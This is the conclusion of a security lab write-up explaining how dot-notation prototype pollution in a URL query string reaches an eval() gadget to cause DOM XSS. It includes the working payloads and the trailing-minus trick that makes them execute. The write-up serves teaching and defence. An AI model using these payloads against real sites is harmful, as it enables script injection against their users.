Conclusion

This laboratory demonstrates how an alternative prototype pollution vector can be chained with a client-side JavaScript gadget to achieve DOM XSS.

The standard payload:

/?__proto__[foo]=bar

was ineffective, but the alternative syntax:

/?__proto__.foo=bar

successfully polluted Object.prototype.

The vulnerable gadget was:

manager.sequence

which was subsequently passed to:

eval()

The initial XSS payload:

/?__proto__.sequence=alert(1)

failed because the application appended the value 1, producing:

alert(1)1

Adding a trailing minus character:

/?__proto__.sequence=alert(1)-

caused the resulting expression to become:

alert(1)-1

which is valid JavaScript.

The final exploitation chain was therefore:

Alternative Prototype Pollution
              +
Prototype Pollution Gadget
              +
Unsafe eval()
              =
DOM XSS

The lab was successfully solved when alert(1) executed in the browser.
